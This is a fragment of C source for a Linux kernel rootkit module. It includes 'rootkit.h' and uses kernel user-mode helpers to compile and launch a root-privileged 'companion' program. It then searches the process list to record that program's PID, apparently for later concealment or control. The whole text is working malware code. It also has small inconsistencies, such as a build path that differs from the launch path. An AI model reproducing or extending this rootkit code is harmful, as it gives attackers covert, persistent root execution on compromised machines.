#include "rootkit.h"

void compile_companion(void) {
	char *argv[] = {"/usr/bin/gcc", "/root/companion.c", "-o", "bin/companion", NULL};
	char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	if (r >= 0) {
		printk(KERN_INFO "Companion compiled\n");
	} else {
		printk(KERN_INFO "Fail %i\n", r);
	}
} 

void launch_companion(void) {
	char *argv[] = {"/bin/companion", NULL};
	char *envp[] = { "HOME=/root", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	if (r >= 0) {
		printk(KERN_INFO "Companion launched\n");
	} else {
		printk(KERN_INFO "Fail\n");
	}
}

void get_pid_companion(void) {
	struct task_struct *task;
	pid_t pid_buff = -1;
	for_each_process(task) {
		if (!strcmp(task->comm, "companion")) {
			g_pid_companion = task->pid;
			break ;
		}
		pid_buff = task->pid;
	}
}
